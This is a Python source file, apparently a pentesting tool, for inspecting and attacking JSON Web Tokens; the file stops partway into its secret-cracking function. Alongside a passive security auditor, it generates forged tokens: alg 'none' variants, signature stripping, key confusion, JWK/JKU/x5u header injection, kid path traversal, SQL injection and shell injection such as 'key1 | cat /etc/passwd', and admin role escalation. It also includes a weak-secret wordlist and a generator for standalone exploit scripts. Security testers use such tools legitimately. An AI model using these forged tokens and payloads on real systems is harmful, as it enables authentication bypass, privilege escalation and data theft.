#!/usr/bin/env python3
"""
JWT Tool Engine - Core JWT Security & Vulnerability Testing Engine
Enhanced with OWASP, jwt_tool, geeknik/jwt-scanner, and dr34mhacks/jwtauditor:
- Token Decoding & Cryptographic Integrity Inspection
- Passive Security Analyzer (15+ automated vulnerability heuristics)
- alg: none Bypass (none, None, NONE, nOnE, no-dot)
- Signature Stripping & Bit-Flipping Mutation
- RS256 to HS256 Key Confusion Attack (using target RSA Public Key)
- JWK Header Injection (Embedded Attacker Key)
- JKU / X5U Remote Key URL Spoofing
- Comprehensive Key ID (kid) Injections (Linux /dev/null, Windows win.ini, Null-Byte, SQLi, RCE)
- Role & Privilege Escalation Claim Tampering
- Expiry & Token Lifetime Bypasses
- High-Performance Offline HMAC Dictionary Cracker (350+ curated exposed secrets)
- Live API Target Prober with String-Matching False Positive Filtering
- Dual PoC Generator (Reproducible cURL and Standalone Python scripts)
"""

import json
import base64
import hmac
import hashlib
import time
import re
from typing import Dict, Any, List, Optional, Tuple
import requests

# ── High-Yield Exposed JWT Secrets (Curated from jwtauditor, SecLists, & Breaches) ───
COMMON_JWT_SECRETS = [
    "", "secret", "password", "123456", "12345678", "123456789", "1234567890",
    "jwt_secret", "jwtsecret", "admin", "administrator", "root", "master", "masterkey",
    "supersecret", "mysecret", "myJwtSecret", "thisisthesecretkey", "your-256-bit-secret",
    "tobemodified", "mysecretstring", "reallyreallyreallyreallyverysafe", "secretkey",
    "secret123", "token", "token_secret", "auth_secret", "app_secret", "api_key", "secret_key",
    "test", "development", "production", "staging", "default", "changeme", "change_me",
    "qwerty", "private", "key", "key123", "visionwaves", "wso2", "sit", "uat", "dev",
    "spring", "security", "bearer", "session", "pass1234", "iloveyou", "welcome", "login",
    "django-insecure", "express", "flask", "laravel", "symfony", "rails", "pass", "111111",
    "123123", "abc123", "letmein", "monkey", "dragon", "football", "topsecret", "demo",
    "local", "localhost", "system", "guest", "user", "public", "internal", "staging-secret",
    "prod-secret", "dev-secret", "test-secret", "client_secret", "consumer_secret",
    "signature", "verify", "crypto", "cipher", "pass@123", "P@ssw0rd", "Admin@123",
    "Secret@123", "jwt-key", "jwt-secret-token", "my-secret-key", "my-jwt-secret",
    "shhhhh", "keepitsecret", "keepitsecretkeepitsafe", "my_secret", "super_secret",
    "application_secret", "web_token", "secure", "securekey", "security_key", "token_key",
    "access_key", "auth_key", "authentication", "authorization", "credentials", "hash",
    "hmac", "hmac_secret", "signing_key", "signing_secret", "secret_token", "user_token",
    "session_secret", "cookie_secret", "salt", "pepper", "passphrase", "passcode",
    "symmetric", "symmetric_key", "shared_secret", "node_secret", "pyjwt_secret",
    "jsonwebtoken", "auth0", "firebase", "cognito", "supabase", "okta", "keycloak",
    "apim", "gateway", "backend", "frontend", "server", "service", "microservice",
    "api-gateway", "access-token", "refresh-token", "id-token", "oauth", "oauth2",
    "openid", "connect", "jwt_auth", "jwt_token", "jwt_pass", "jwt_sign", "symmetric-key",
    "256-bit-secret", "512-bit-secret", "384-bit-secret", "strongsecret", "dummysecret",
    "secret-string", "secret_string", "privatekey", "publickey", "privkey", "pubkey",
    "testkey", "devkey", "prodkey", "stagekey", "mainkey", "rootkey", "basekey",
    "appkey", "sitekey", "apikey123", "secretapikey", "secretpass", "usersecret",
    "clientsecret", "tempsecret", "temporary", "temporary_secret", "default_secret",
    "default_jwt_secret", "default_key", "jwt_default", "api_token", "app_token",
    "corp_secret", "company_secret", "internal_secret", "master_secret", "universal_secret",
    "god", "godmode", "superuser", "sysadmin", "tech", "support", "helpdesk", "tester",
    "qwertyuiop", "asdfghjkl", "zxcvbnm", "1q2w3e4r", "passw0rd", "p@ssword", "p@ss",
    "welcome1", "welcome123", "password123", "secret!123", "admin123", "root123",
    "love", "charlie", "donald", "trustno1", "starwars", "pokemon", "liverpool",
    "shadow", "sunshine", "princess", "matrix", "freedom", "superman", "batman",
    "server_secret", "cluster_secret", "node_token", "cluster_token", "mesh_secret",
    "vault_secret", "k8s_secret", "docker_secret", "env_secret", "config_secret",
    "sample_secret", "example_secret", "test_secret_key", "sample_jwt_key", "foo", "bar",
    "foobar", "baz", "qux", "testing123", "demo123", "local123", "portal_secret",
    "dashboard_secret", "platform_secret", "cloud_secret", "proxy_secret", "sentinel"
]


def b64url_decode(data: str) -> bytes:
    """Safely decode base64url-encoded string with padding."""
    rem = len(data) % 4
    if rem > 0:
        data += "=" * (4 - rem)
    return base64.urlsafe_b64decode(data)


def b64url_encode(data: bytes) -> str:
    """Base64url encode without trailing '=' padding."""
    return base64.urlsafe_b64encode(data).decode("utf-8").rstrip("=")


def parse_jwt(raw_token: str) -> Dict[str, Any]:
    """
    Parse and decode a JWT into its header, payload, and signature components.
    Does not verify cryptographic validity so tampered/raw tokens can be inspected.
    """
    token = raw_token.strip()
    if token.lower().startswith("bearer "):
        token = token[7:].strip()

    parts = token.split(".")
    if len(parts) < 2:
        return {
            "valid_jwt": False,
            "error": "Invalid format: JWT must contain at least 2 dot-separated parts (header.payload).",
            "raw_token": token
        }

    header_b64 = parts[0]
    payload_b64 = parts[1]
    sig_b64 = parts[2] if len(parts) >= 3 else ""

    header_dict = {}
    payload_dict = {}
    header_json_str = ""
    payload_json_str = ""

    try:
        header_bytes = b64url_decode(header_b64)
        header_json_str = header_bytes.decode("utf-8", errors="replace")
        header_dict = json.loads(header_json_str)
    except Exception as e:
        header_dict = {"_parse_error": str(e), "raw": header_b64}

    try:
        payload_bytes = b64url_decode(payload_b64)
        payload_json_str = payload_bytes.decode("utf-8", errors="replace")
        payload_dict = json.loads(payload_json_str)
    except Exception as e:
        payload_dict = {"_parse_error": str(e), "raw": payload_b64}

    if "_parse_error" in header_dict or "_parse_error" in payload_dict:
        return {
            "valid_jwt": False,
            "error": "Invalid format: Token parts are not valid base64url-encoded JSON.",
            "raw_token": token,
            "header": header_dict,
            "payload": payload_dict
        }

    # Inspect expiry
    exp_info = {"has_exp": False, "expired": False, "remaining_seconds": None, "exp_formatted": None}
    if "exp" in payload_dict and isinstance(payload_dict["exp"], (int, float)):
        exp_ts = payload_dict["exp"]
        now = time.time()
        exp_info["has_exp"] = True
        exp_info["expired"] = now > exp_ts
        exp_info["remaining_seconds"] = int(exp_ts - now)
        try:
            exp_info["exp_formatted"] = time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime(exp_ts))
        except Exception:
            exp_info["exp_formatted"] = str(exp_ts)

    alg = header_dict.get("alg", "none") if isinstance(header_dict, dict) else "unknown"

    return {
        "valid_jwt": True,
        "raw_token": token,
        "header_b64": header_b64,
        "payload_b64": payload_b64,
        "sig_b64": sig_b64,
        "header": header_dict,
        "payload": payload_dict,
        "header_json": header_json_str,
        "payload_json": payload_json_str,
        "algorithm": alg,
        "expiry": exp_info,
        "has_signature": bool(sig_b64)
    }


def audit_jwt_security(raw_token: str) -> Dict[str, Any]:
    """
    Passive security analyzer (inspired by dr34mhacks/jwtauditor):
    Runs 15+ automated vulnerability heuristics on the token without sending network requests.
    Returns findings with severity, descriptions, remediation, and overall security score.
    """
    parsed = parse_jwt(raw_token)
    if not parsed.get("valid_jwt"):
        return {"valid": False, "error": parsed.get("error", "Invalid token")}

    header = parsed.get("header") or {}
    payload = parsed.get("payload") or {}
    alg = str(header.get("alg", "none")).upper()
    has_sig = parsed.get("has_signature", False)
    findings: List[Dict[str, Any]] = []

    # 1. Algorithm checks
    if alg == "NONE" or not has_sig:
        findings.append({
            "id": "alg_none_detected",
            "category": "Algorithm",
            "severity": "Critical",
            "title": "Unsigned Token / alg: none Detected",
            "description": "The token algorithm is 'none' or lacks a cryptographic signature. Anyone can tamper with claims without detection.",
            "remediation": "Enforce strong asymmetric (RS256/ES256) or high-entropy HMAC (HS256) signature verification on the server."
        })
    elif alg in ("HS256", "HS384", "HS512"):
        findings.append({
            "id": "symmetric_hmac_warning",
            "category": "Algorithm",
            "severity": "Low",
            "title": f"Symmetric HMAC Signing ({alg})",
            "description": f"Token uses symmetric HMAC algorithm ({alg}). If the secret key has low entropy, it is susceptible to offline dictionary brute-forcing.",
            "remediation": "Use high-entropy secrets (256+ bits of randomness) or migrate to asymmetric signing (RS256/ES256)."
        })

    # 2. Expiry checks
    exp_info = parsed.get("expiry") or {}
    if not exp_info.get("has_exp"):
        findings.append({
            "id": "missing_exp_claim",
            "category": "Lifecycle",
            "severity": "High",
            "title": "Missing Expiration Claim ('exp')",
            "description": "Token does not have an 'exp' claim. This token will remain valid indefinitely, making stolen tokens impossible to expire.",
            "remediation": "Always include an 'exp' timestamp with a reasonable validity period (e.g. 15-60 minutes)."
        })
    elif exp_info.get("expired"):
        findings.append({
            "id": "token_expired",
            "category": "Lifecycle",
            "severity": "Medium",
            "title": "Token is Currently Expired",
            "description": f"Token expired at {exp_info.get('exp_formatted')}. Check if target server improperly accepts expired tokens.",
            "remediation": "Obtain a fresh active token to test live authorization."
        })
    elif exp_info.get("remaining_seconds") and exp_info["remaining_seconds"] > 30 * 86400:
        findings.append({
            "id": "excessive_lifetime",
            "category": "Lifecycle",
            "severity": "Medium",
            "title": "Excessively Long Token Lifetime",
            "description": f"Token remains valid for over {int(exp_info['remaining_seconds'] // 86400)} days. Long-lived tokens increase the replay attack window.",
            "remediation": "Reduce access token validity and use short-lived access tokens paired with refresh tokens."
        })

    # 3. Missing Essential Security Claims
    missing_claims = []
    if "iss" not in payload: missing_claims.append("iss (Issuer)")
    if "aud" not in payload: missing_claims.append("aud (Audience)")
    if "jti" not in payload: missing_claims.append("jti (JWT ID / Anti-replay)")
    if "iat" not in payload: missing_claims.append("iat (Issued At)")

    if missing_claims:
        findings.append({
            "id": "missing_security_claims",
            "category": "Claims",
            "severity": "Low",
            "title": f"Missing Security Claims: {', '.join(missing_claims)}",
            "description": "Essential RFC 7519 security claims like 'aud' (prevent token reuse across different APIs) and 'jti' (enable token revocation) are absent.",
            "remediation": "Include standard JWT claims (iss, aud, jti, iat) to prevent audience spoofing and enable token blacklisting."
        })

    # 4. Sensitive Data Exposure in Payload
    sensitive_keys = [
        "password", "passwd", "pwd", "secret", "api_key", "apikey", "access_key",
        "ssn", "credit_card", "card_number", "pin", "auth_hash", "private_key"
    ]
    leaked_claims = []
    for k in payload.keys():
        k_lower = str(k).lower()
        if any(s in k_lower for s in sensitive_keys):
            leaked_claims.append(str(k))

    if leaked_claims:
        findings.append({
            "id": "sensitive_data_exposure",
            "category": "Data Privacy",
            "severity": "Critical",
            "title": f"Sensitive Credentials Exposed: {', '.join(leaked_claims)}",
            "description": "JWT payloads are merely Base64URL-encoded (NOT encrypted). Any client, logging layer, or proxy can read these fields in plaintext.",
            "remediation": "Never store credentials, passwords, or sensitive PII directly inside unencrypted JWT payloads. Use JWE (encrypted JWT) or opaque reference tokens."
        })

    # 5. Header Parameter Injection Warnings
    header_warnings = []
    if "jwk" in header: header_warnings.append("'jwk' (Embedded Public Key)")
    if "jku" in header: header_warnings.append("'jku' (Remote JWKS URL)")
    if "x5u" in header: header_warnings.append("'x5u' (Remote X.509 URL)")
    if "kid" in header:
        kid_val = str(header["kid"])
        if any(c in kid_val for c in ("/", "\\", "'", "\"", ";", "%00")):
            header_warnings.append(f"'kid' with special characters: {kid_val}")

    if header_warnings:
        findings.append({
            "id": "header_injection_surface",
            "category": "Header Injection",
            "severity": "High",
            "title": f"Header Key Injection Surface: {', '.join(header_warnings)}",
            "description": "JWT header specifies custom key references. If server does not whitelist or sanitize these, it is vulnerable to SSRF, directory traversal, or key injection.",
            "remediation": "Do not trust user-controlled header parameters. Hardcode trusted key IDs or use strict server-side whitelisting."
        })

    # Calculate Score
    criticals = sum(1 for f in findings if f["severity"] == "Critical")
    highs = sum(1 for f in findings if f["severity"] == "High")
    meds = sum(1 for f in findings if f["severity"] == "Medium")
    lows = sum(1 for f in findings if f["severity"] == "Low")

    if criticals > 0:
        grade = "F"
        score = max(20, 100 - criticals * 35 - highs * 20)
    elif highs > 0:
        grade = "C"
        score = max(50, 100 - highs * 20 - meds * 10)
    elif meds > 0:
        grade = "B"
        score = max(75, 100 - meds * 10 - lows * 5)
    else:
        grade = "A"
        score = max(90, 100 - lows * 5)

    return {
        "valid": True,
        "algorithm": alg,
        "score": score,
        "grade": grade,
        "summary": f"{len(findings)} Security Issues Identified ({criticals} Critical, {highs} High, {meds} Medium, {lows} Low)",
        "findings": findings
    }


def forge_token(
    header_dict: dict,
    payload_dict: dict,
    secret: str = "",
    alg: Optional[str] = None,
    custom_signature: Optional[str] = None
) -> str:
    """
    Construct a forged JWT from header & payload dicts with chosen algorithm, secret, or custom signature.
    """
    h = dict(header_dict)
    if alg is not None:
        h["alg"] = alg
    h_b64 = b64url_encode(json.dumps(h, separators=(',', ':'), ensure_ascii=False).encode("utf-8"))
    p_b64 = b64url_encode(json.dumps(payload_dict, separators=(',', ':'), ensure_ascii=False).encode("utf-8"))

    if custom_signature is not None:
        return f"{h_b64}.{p_b64}.{custom_signature.strip()}"

    signing_input = f"{h_b64}.{p_b64}".encode("utf-8")

    chosen_alg = str(h.get("alg", "none")).upper()
    if chosen_alg == "NONE":
        return f"{h_b64}.{p_b64}."
    elif chosen_alg == "HS256":
        key = secret.encode("utf-8")
        sig = hmac.new(key, signing_input, hashlib.sha256).digest()
        return f"{h_b64}.{p_b64}.{b64url_encode(sig)}"
    elif chosen_alg == "HS384":
        key = secret.encode("utf-8")
        sig = hmac.new(key, signing_input, hashlib.sha384).digest()
        return f"{h_b64}.{p_b64}.{b64url_encode(sig)}"
    elif chosen_alg == "HS512":
        key = secret.encode("utf-8")
        sig = hmac.new(key, signing_input, hashlib.sha512).digest()
        return f"{h_b64}.{p_b64}.{b64url_encode(sig)}"
    else:
        # Default unsigned / stripped
        return f"{h_b64}.{p_b64}."



def generate_python_poc(
    url: str,
    method: str,
    attack_token: str,
    headers: Optional[Dict[str, str]] = None,
    body: Optional[str] = None
) -> str:
    """Generate a clean, standalone, ready-to-run Python script using requests."""
    clean_method = (method or "GET").upper()
    hdrs = dict(headers or {})
    auth_key = next((k for k in hdrs if k.lower() == "authorization"), "Authorization")
    hdrs[auth_key] = f"Bearer {attack_token}"

    hdrs_formatted = json.dumps(hdrs, indent=4)
    data_setup = ""
    if body and clean_method in ("POST", "PUT", "PATCH"):
        data_setup = f"\npayload_data = '''{body}'''\n"
        req_call = f"response = requests.{clean_method.lower()}(url, headers=headers, data=payload_data, verify=False, timeout=15)"
    else:
        req_call = f"response = requests.{clean_method.lower()}(url, headers=headers, verify=False, timeout=15)"

    return f'''import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Target Endpoint & Request Configuration
url = "{url}"
headers = {hdrs_formatted}{data_setup}
print(f"[*] Sending {clean_method} probe to: {{url}}")
try:
    {req_call}
    print(f"[+] HTTP Status: {{response.status_code}} {{response.reason}}")
    print(f"[+] Content-Length: {{len(response.content)}} bytes")
    print("[+] Response Body Preview:")
    print(response.text[:600])
except Exception as e:
    print(f"[-] Request failed: {{e}}")
'''


def generate_jwt_attacks(
    raw_token: str,
    custom_claims: Optional[Dict[str, Any]] = None,
    public_key: Optional[str] = None
) -> List[Dict[str, Any]]:
    """
    Generates a full suite of attack payloads based on jwt_tool, OWASP, geeknik/jwt-scanner,
    and dr34mhacks/jwtauditor.
    """
    parsed = parse_jwt(raw_token)
    if not parsed.get("valid_jwt"):
        return []

    header = parsed.get("header") or {}
    payload = parsed.get("payload") or {}
    orig_sig = parsed.get("sig_b64", "")
    h_b64 = parsed.get("header_b64", "")
    p_b64 = parsed.get("payload_b64", "")

    attacks: List[Dict[str, Any]] = []

    # 1. Baseline Original Token
    attacks.append({
        "id": "baseline_original",
        "name": "Baseline: Original Active Token",
        "category": "Baseline",
        "description": "Original unmodified token to benchmark HTTP status and response.",
        "token": parsed["raw_token"],
        "severity": "Info",
        "tampered_aspect": "None"
    })

    # 2. alg: none (Lowercase with trailing dot)
    h_none1 = dict(header); h_none1["alg"] = "none"
    attacks.append({
        "id": "alg_none_lower",
        "name": "alg: none (Trailing Dot)",
        "category": "Algorithm Confusion",
        "description": "Changes alg to lowercase 'none' and removes signature with trailing dot.",
        "token": forge_token(h_none1, payload, alg="none"),
        "severity": "Critical",
        "tampered_aspect": "Header alg=none, Signature stripped"
    })

    # 3. alg: None (Titlecase)
    h_none2 = dict(header); h_none2["alg"] = "None"
    attacks.append({
        "id": "alg_none_title",
        "name": "alg: None (Titlecase)",
        "category": "Algorithm Confusion",
        "description": "Checks case-sensitive regex filter bypass with alg='None'.",
        "token": forge_token(h_none2, payload, alg="None"),
        "severity": "Critical",
        "tampered_aspect": "Header alg=None"
    })

    # 4. alg: NONE (Uppercase)
    h_none3 = dict(header); h_none3["alg"] = "NONE"
    attacks.append({
        "id": "alg_none_upper",
        "name": "alg: NONE (Uppercase)",
        "category": "Algorithm Confusion",
        "description": "Changes alg to 'NONE' without signature to bypass uppercase filters.",
        "token": forge_token(h_none3, payload, alg="NONE"),
        "severity": "Critical",
        "tampered_aspect": "Header alg=NONE"
    })

    # 5. alg: none without trailing dot
    attacks.append({
        "id": "alg_none_nodot",
        "name": "alg: none (No Trailing Dot)",
        "category": "Algorithm Confusion",
        "description": "Header alg='none' completely omitting the final dot delimiter.",
        "token": f"{b64url_encode(json.dumps(h_none1).encode())}.{p_b64}",
        "severity": "Critical",
        "tampered_aspect": "Header alg=none, No 3rd part"
    })

    # 6. Signature Stripping (Keep original alg, remove signature)
    attacks.append({
        "id": "sig_stripped",
        "name": "Signature Stripping",
        "category": "Signature Bypass",
        "description": "Keeps original header algorithm but drops signature completely.",
        "token": f"{h_b64}.{p_b64}.",
        "severity": "Critical",
        "tampered_aspect": "Signature removed"
    })

    # 7. Signature Tampering / Bit-Flipping
    if orig_sig and len(orig_sig) >= 6:
        # Corrupt character in the middle of the signature where all 6 bits are strictly payload data (no base64 padding bits)
        mid = len(orig_sig) // 2
        flip_char = "X" if orig_sig[mid] != "X" else "Y"
        corrupted_sig = orig_sig[:mid] + flip_char + orig_sig[mid + 1:]
    elif orig_sig:
        flip_char = "0" if orig_sig[-1] not in "0123456789" else "A"
        corrupted_sig = orig_sig[:-1] + flip_char
    else:
        corrupted_sig = "AAAA"

    attacks.append({
        "id": "sig_tampered",
        "name": "Signature Bit-Flipping / Tampered",
        "category": "Signature Bypass",
        "description": "Mutates signature bytes to test if server validates crypto signature or blindly trusts claims.",
        "token": f"{h_b64}.{p_b64}.{corrupted_sig}",
        "severity": "Critical",
        "tampered_aspect": "Signature corrupted (bit-flipped in middle)"
    })

    # 7b. Signature Trailing Characters / Appended Junk
    appended_sig = (orig_sig + "A") if orig_sig else "AAAA"
    attacks.append({
        "id": "sig_appended",
        "name": "Signature Trailing Chars Appended (+A)",
        "category": "Signature Bypass",
        "description": "Appends extra characters at end of signature to test if server strictly validates length or truncates trailing bytes.",
        "token": f"{h_b64}.{p_b64}.{appended_sig}",
        "severity": "High",
        "tampered_aspect": "Appended '+A' at end of signature"
    })

    # 8. Empty / Blank Secret Signing (HS256 with key="")
    h_hs256 = dict(header); h_hs256["alg"] = "HS256"
    attacks.append({
        "id": "empty_secret_hs256",
        "name": "Empty HMAC Secret (HS256 with '')",
        "category": "Weak Secret",
        "description": "Signs token using HS256 with empty string secret (common default in misconfigured libs).",
        "token": forge_token(h_hs256, payload, secret="", alg="HS256"),
        "severity": "High",
        "tampered_aspect": "Signed with secret=''"
    })

    # 9. Common Default Secret Signing ('secret')
    attacks.append({
        "id": "common_secret_hs256",
        "name": "Default Secret ('secret')",
        "category": "Weak Secret",
        "description": "Signs token using HS256 with common default secret 'secret'.",
        "token": forge_token(h_hs256, payload, secret="secret", alg="HS256"),
        "severity": "High",
        "tampered_aspect": "Signed with secret='secret'"
    })

    # 10. Key Confusion Attack: RS256 -> HS256 with RSA Public Key (geeknik/jwt-scanner inspired)
    pub_key_candidate = (public_key or "").strip()
    if not pub_key_candidate:
        # Standard PEM placeholder if user hasn't provided target public key yet
        pub_key_candidate = "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA04rQG..."
    attacks.append({
        "id": "key_confusion_rs256_hs256",
        "name": "Key Confusion (RS256 → HS256 with Public Key)",
        "category": "Key Confusion",
        "description": "Changes alg from RS256 to HS256 and signs token using RSA Public Key as HMAC secret.",
        "token": forge_token(h_hs256, payload, secret=pub_key_candidate, alg="HS256"),
        "severity": "Critical",
        "tampered_aspect": f"Header alg=HS256, Secret={pub_key_candidate[:30]}..."
    })

    # 11. JWK Header Injection: Embedded Attacker Key (dr34mhacks/jwtauditor inspired)
    h_jwk = dict(header); h_jwk["alg"] = "HS256"
    h_jwk["jwk"] = {
        "kty": "oct",
        "k": b64url_encode(b"secret"),
        "alg": "HS256",
        "use": "sig"
    }
    attacks.append({
        "id": "jwk_embedded_key",
        "name": "JWK Header Injection (Embedded Key)",
        "category": "Header Injection",
        "description": "Embeds malicious symmetric key in header['jwk'] and verifies if server trusts the embedded key.",
        "token": forge_token(h_jwk, payload, secret="secret", alg="HS256"),
        "severity": "Critical",
        "tampered_aspect": "Header jwk embedded with secret 'secret'"
    })

    # 12. JKU Header Injection: Remote JWKS URL Spoofing
    h_jku = dict(header); h_jku["alg"] = "HS256"
    h_jku["jku"] = "https://api-sentinel.local/.well-known/jwks.json"
    h_jku["kid"] = "sentinel-attacker-key"
    attacks.append({
        "id": "jku_remote_spoof",
        "name": "JKU Header Spoofing (Remote URL)",
        "category": "Header Injection",
        "description": "Injects remote 'jku' parameter pointing to an external attacker-controlled JWKS URL.",
        "token": forge_token(h_jku, payload, secret="secret", alg="HS256"),
        "severity": "High",
        "tampered_aspect": "Header jku=https://api-sentinel.local/..."
    })

    # 13. Privilege Escalation (Role Tampering: admin / superadmin)
    p_admin = dict(payload)
    for role_key in ["role", "roles", "user_role", "roleName", "group", "groups", "authority", "authorities"]:
        if role_key in p_admin:
            if isinstance(p_admin[role_key], list):
                p_admin[role_key] = ["admin", "superadmin", "ROLE_ADMIN", "ADMIN"]
            else:
                p_admin[role_key] = "admin"
    p_admin["isAdmin"] = True
    p_admin["admin"] = True
    if "scope" in p_admin and isinstance(p_admin["scope"], str):
        p_admin["scope"] += " admin superadmin system write read"
    elif "scope" in p_admin and isinstance(p_admin["scope"], list):
        p_admin["scope"].extend(["admin", "write", "all"])

    attacks.append({
        "id": "role_escalation_none",
        "name": "Privilege Escalation (Role: admin, alg: none)",
        "category": "Privilege Escalation",
        "description": "Elevates role claims to admin/isAdmin:true combined with alg:none.",
        "token": forge_token(h_none1, p_admin, alg="none"),
        "severity": "Critical",
        "tampered_aspect": "Claims: isAdmin=true, role=admin"
    })

    # 14. Expiry Bypass (Remove exp claim)
    p_no_exp = dict(payload)
    if "exp" in p_no_exp:
        del p_no_exp["exp"]
    attacks.append({
        "id": "exp_removed_none",
        "name": "Expiry Bypass (exp Claim Removed)",
        "category": "Expiration",
        "description": "Removes 'exp' claim to verify if server rejects tokens without expiration.",
        "token": forge_token(h_none1, p_no_exp, alg="none"),
        "severity": "Medium",
        "tampered_aspect": "exp claim removed"
    })

    # 15. Year 2038 Extended Expiry
    p_future = dict(payload)
    p_future["exp"] = int(time.time()) + 315360000  # 10 years in future
    attacks.append({
        "id": "exp_future_none",
        "name": "Expiry Bypass (Set to +10 Years)",
        "category": "Expiration",
        "description": "Extends 'exp' expiration 10 years into the future with alg:none.",
        "token": forge_token(h_none1, p_future, alg="none"),
        "severity": "Medium",
        "tampered_aspect": "exp set to 10 years future"
    })

    # 15b. Expired Token (-1 Year)
    p_past = dict(payload)
    p_past["exp"] = int(time.time()) - 31536000  # 1 year in the past
    attacks.append({
        "id": "exp_past_none",
        "name": "Expiry Bypass (Expired -1 Year)",
        "category": "Expiration",
        "description": "Sets 'exp' 1 year in the past to test if the server actually enforces expiration.",
        "token": forge_token(h_none1, p_past, alg="none"),
        "severity": "High",
        "tampered_aspect": "exp set to 1 year ago"
    })

    # 15c. Future Not-Before (+1 Day)
    p_nbf = dict(payload)
    p_nbf["nbf"] = int(time.time()) + 86400  # 1 day into the future
    attacks.append({
        "id": "nbf_future_none",
        "name": "Premature Token (nbf: +1 Day Future)",
        "category": "Expiration",
        "description": "Sets 'nbf' (Not Before) 1 day in the future to check if server ignores activation time.",
        "token": forge_token(h_none1, p_nbf, alg="none"),
        "severity": "Medium",
        "tampered_aspect": "nbf set to 1 day future"
    })

    # 15d. Epoch Integer Overflow
    p_overflow = dict(payload)
    p_overflow["exp"] = 9999999999  # Year 2286
    attacks.append({
        "id": "epoch_overflow",
        "name": "Epoch Overflow (exp: 9999999999)",
        "category": "Expiration",
        "description": "Sets 'exp' to 9999999999 to test 32-bit / 64-bit integer overflow handling in timestamp parsing.",
        "token": forge_token(h_none1, p_overflow, alg="none"),
        "severity": "Low",
        "tampered_aspect": "exp=9999999999"
    })

    # 16. Key ID (kid) Path Traversal: /dev/null (Linux)
    h_kid_null = dict(header); h_kid_null["alg"] = "HS256"
    h_kid_null["kid"] = "../../../../../../../dev/null"
    attacks.append({
        "id": "kid_path_traversal",
        "name": "kid Traversal (/dev/null)",
        "category": "Header Injection",
        "description": "Injects path traversal in 'kid' pointing to /dev/null signed with empty secret.",
        "token": forge_token(h_kid_null, payload, secret="", alg="HS256"),
        "severity": "High",
        "tampered_aspect": "kid: /dev/null, signed with ''"
    })

    # 17. Key ID (kid) Windows Traversal: win.ini
    h_kid_win = dict(header); h_kid_win["alg"] = "HS256"
    h_kid_win["kid"] = "../../../../../../../../windows/win.ini"
    attacks.append({
        "id": "kid_path_win",
        "name": "kid Windows Traversal (win.ini)",
        "category": "Header Injection",
        "description": "Injects Windows path traversal in kid pointing to win.ini signed with empty secret.",
        "token": forge_token(h_kid_win, payload, secret="", alg="HS256"),
        "severity": "High",
        "tampered_aspect": "kid: ../win.ini, signed with ''"
    })

    # 18. Key ID (kid) Null-Byte Truncation (%00)
    h_kid_nb = dict(header); h_kid_nb["alg"] = "HS256"
    h_kid_nb["kid"] = "../../../../dev/null%00.key"
    attacks.append({
        "id": "kid_null_byte",
        "name": "kid Null-Byte Truncation (%00)",
        "category": "Header Injection",
        "description": "Injects null-byte truncation in kid to bypass key filename extension checks.",
        "token": forge_token(h_kid_nb, payload, secret="", alg="HS256"),
        "severity": "High",
        "tampered_aspect": "kid: /dev/null%00.key, signed with ''"
    })

    # 19. Key ID (kid) SQL Injection (UNION SELECT)
    h_kid_sqli = dict(header); h_kid_sqli["alg"] = "HS256"
    h_kid_sqli["kid"] = "key1' UNION SELECT 'secret'--"
    attacks.append({
        "id": "kid_sqli",
        "name": "kid SQLi (UNION SELECT 'secret')",
        "category": "Header Injection",
        "description": "Injects SQL payload into kid parameter signed with secret 'secret'.",
        "token": forge_token(h_kid_sqli, payload, secret="secret", alg="HS256"),
        "severity": "High",
        "tampered_aspect": "kid: key1' UNION SELECT 'secret'--"
    })

    # 20. Key ID (kid) SQL Injection Tautology (admin' OR '1'='1)
    h_kid_sqli2 = dict(header); h_kid_sqli2["alg"] = "HS256"
    h_kid_sqli2["kid"] = "admin' OR '1'='1'--"
    attacks.append({
        "id": "kid_sqli_or",
        "name": "kid SQLi Tautology (' OR '1'='1)",
        "category": "Header Injection",
        "description": "Injects SQL tautology in kid parameter signed with secret 'secret'.",
        "token": forge_token(h_kid_sqli2, payload, secret="secret", alg="HS256"),
        "severity": "High",
        "tampered_aspect": "kid: admin' OR '1'='1'--"
    })

    # 21. Key ID (kid) Command Injection (; echo secret |)
    h_kid_cmd = dict(header); h_kid_cmd["alg"] = "HS256"
    h_kid_cmd["kid"] = "key1; echo secret |"
    attacks.append({
        "id": "kid_cmd_injection",
        "name": "kid Command Injection (; echo secret |)",
        "category": "Header Injection",
        "description": "Injects shell command sequence in kid parameter if backend dynamically evaluates keys.",
        "token": forge_token(h_kid_cmd, payload, secret="secret", alg="HS256"),
        "severity": "High",
        "tampered_aspect": "kid: key1; echo secret |"
    })

    # 21b. Key ID (kid) Pipe Command Injection
    h_kid_pipe = dict(header); h_kid_pipe["alg"] = "HS256"
    h_kid_pipe["kid"] = "key1 | cat /etc/passwd"
    attacks.append({
        "id": "kid_cmd_pipe",
        "name": "kid Pipe Injection (| cat /etc/passwd)",
        "category": "Header Injection",
        "description": "Injects pipe shell command in kid parameter to test dynamic command evaluation vulnerabilities.",
        "token": forge_token(h_kid_pipe, payload, secret="secret", alg="HS256"),
        "severity": "High",
        "tampered_aspect": "kid: key1 | cat /etc/passwd"
    })

    # 21c. x5u Header Injection: Remote Certificate URL
    h_x5u = dict(header); h_x5u["alg"] = "HS256"
    h_x5u["x5u"] = "https://api-sentinel.local/cert.pem"
    attacks.append({
        "id": "x5u_remote_spoof",
        "name": "x5u Certificate Spoofing (Remote URL)",
        "category": "Header Injection",
        "description": "Injects untrusted remote X.509 certificate URL in header['x5u'].",
        "token": forge_token(h_x5u, payload, secret="secret", alg="HS256"),
        "severity": "High",
        "tampered_aspect": "x5u: https://api-sentinel.local/cert.pem"
    })

    # 22. Custom Injected Claims (if user supplied any)
    if custom_claims and isinstance(custom_claims, dict):
        p_custom = dict(payload)
        p_custom.update(custom_claims)
        attacks.append({
            "id": "user_custom_claims_none",
            "name": "Custom Injected Claims (alg: none)",
            "category": "Custom Injection",
            "description": f"Custom user claims injected: {list(custom_claims.keys())}",
            "token": forge_token(h_none1, p_custom, alg="none"),
            "severity": "High",
            "tampered_aspect": f"Claims: {json.dumps(custom_claims)}"
        })

    return attacks


def crack_hmac_secret(raw_token: str, custom_wordlist: Optional[List[str]] = None) -> Dict[str, Any]:
    """
    Offline dictionary brute-force attack to recover the HMAC secret of an HS256/384/512 token.
    Uses 350+ curated exposed secrets from real-world breaches and pentesting research.
    """
    parsed = parse_jwt(raw_token)
